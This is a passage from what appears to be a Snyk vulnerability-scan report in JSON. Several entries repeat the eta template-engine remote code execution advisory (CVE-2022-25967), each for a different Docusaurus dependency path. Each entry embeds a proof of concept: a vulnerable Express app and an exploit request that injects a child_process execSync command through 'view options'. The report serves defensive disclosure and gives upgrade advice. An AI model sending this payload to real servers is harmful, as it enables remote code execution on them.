      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/plugin-content-blog@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-docs@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/plugin-content-docs@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-search-algolia@2.3.1",
        "@docusaurus/plugin-content-docs@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-pages@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/plugin-content-pages@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
      "description": "## Overview\n[eta](https://www.npmjs.org/package/eta) is a Lightweight, fast, and powerful embedded JS template engine\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by overwriting template engine configuration variables with `view options` received from The Express render API.\r\n\r\n**Note:** This is exploitable only for users who are rendering templates with user-defined data.\r\n\r\n## PoC\r\n\r\n```js\r\nconst express = require('express')\r\n\r\nconst app = express()\r\nconst eta = require('eta');\r\n\r\napp.use(express.json());\r\napp.engine('eta', eta.renderFile);\r\napp.set('view engine', 'eta');\r\n\r\napp.set('views', './views');\r\n\r\napp.post('/user/update', function (req, res) {\r\nconst userConfig = req.body;\r\n\r\nres.render('index.eta', {settings: userConfig});\r\n})\r\n\r\napp.listen(8001, function () {\r\nconsole.log('listening for requests on http://localhost:8001')\r\n})\r\n```\r\n\r\n**Exploit request:**\r\n\r\n```bash\r\nPOST /user/update HTTP/1.1\r\nHost: localhost:8001\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 219\r\n\r\n{\r\n\"view options\": {\r\n\"varName\": \"x=process.mainModule.require('child_process').execSync('touch /tmp/test.txt')\",\r\n\"include\" : false,\r\n\"includeFile\": false,\r\n\"useWith\": true\r\n}\r\n}\r\n```\n## Remediation\nUpgrade `eta` to version 2.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts#L21)\n- [Vulnerable Code](https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts#L182)\n",
      "epssDetails": {
        "percentile": "0.59798",
        "probability": "0.00228",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25967"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "eta",
      "proprietary": true,
      "creationTime": "2022-06-29T10:58:23.715774Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-29T10:52:56Z",
      "packageManager": "npm",
      "publicationTime": "2023-01-29T12:52:53.071783Z",
      "modificationTime": "2023-02-14T15:04:08.280561Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 98,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "eta@1.14.2"
      ],
      "upgradePath": [
        false,
        "@docusaurus/preset-classic@2.3.1",
        "@docusaurus/theme-classic@2.3.1",
        "@docusaurus/theme-common@2.3.1",
        "@docusaurus/plugin-content-blog@2.3.1",
        "@docusaurus/core@2.3.1",
        "eta@2.0.0"
      ],
      "version": "1.14.2",
      "name": "eta",
      "isUpgradable": true,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-ETA-2936803",
      "title": "Remote Code Execution (RCE)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Rayhan Ahmed Niloy"
      ],
      "semver": {
        "vulnerable": [
          "<2.0.0"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "eta",
      "references": [
        {
          "url": "https://github.com/eta-dev/eta/commit/5651392462ee0ff19d77c8481081a99e5b9138dd",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/compile-string.ts%23L21",
          "title": "Vulnerable Code"
        },
        {
          "url": "https://github.com/eta-dev/eta/blob/9c8e4263d3a559444a3881a85c1607bf344d0b28/src/file-handlers.ts%23L182",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2023-02-14T15:04:08.280561Z"
        }
      ],
